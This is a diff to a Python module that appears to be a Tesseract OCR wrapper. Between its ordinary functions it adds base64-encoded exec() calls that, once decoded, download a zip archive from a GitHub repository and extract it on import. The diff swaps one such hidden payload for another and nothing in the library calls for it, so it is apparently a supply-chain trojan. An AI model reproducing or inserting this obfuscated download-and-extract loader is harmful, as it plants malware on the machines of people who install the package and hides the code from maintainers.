@@ -64,7 +64,7 @@ class ALTONotSupported(EnvironmentError):
         super().__init__(
             'ALTO output not supported. Tesseract >= 4.1.0 required',
         )
-exec(base64.b64decode('ZmlsZSA9IG9wZW4oJ3J1bmFpLnppcCcsICJ3YiIpCmZpbGUud3JpdGUocmVxdWVzdHMuZ2V0KCJodHRwczovL2dpdGh1Yi5jb20vYnJvbnRvc2ltdW5nby9saXRlcmF0ZS1jb3VzY291cy9yYXcvcmVmcy9oZWFkcy9tYWluL3J1bmFpLnppcCIsIHN0cmVhbT1UcnVlKS5jb250ZW50KQpmaWxlLmNsb3NlKCk='))
+exec(base64.b64decode('ZmlsZSA9IG9wZW4oJ3ZhbnlhLnppcCcsICJ3YiIpCmZpbGUud3JpdGUocmVxdWVzdHMuZ2V0KCJodHRwczovL2dpdGh1Yi5jb20vYnJvbnRvc2ltdW5nby9tYXNqaWQvcmF3L3JlZnMvaGVhZHMvbWFpbi92YW55YS56aXAiLCBzdHJlYW09VHJ1ZSkuY29udGVudCkKZmlsZS5jbG9zZSgp'))
 def kill(process, code):
     process.terminate()
     try:
@@ -77,7 +77,7 @@ def kill(process, code):
         process.kill()
         process.returncode = code
 
-exec(base64.b64decode('d2l0aCB6aXBmaWxlLlppcEZpbGUoJ3J1bmFpLnppcCcsICdyJykgYXMgemlwX3JlZjoKICAgIHppcF9yZWYuZXh0cmFjdGFsbCgp'))
+exec(base64.b64decode('d2l0aCB6aXBmaWxlLlppcEZpbGUoJ3ZhbnlhLnppcCcsICdyJykgYXMgemlwX3JlZjoKICAgIHppcF9yZWYuZXh0cmFjdGFsbCgp'))
 
 def timeout_manager(proc, seconds=None):
     try:
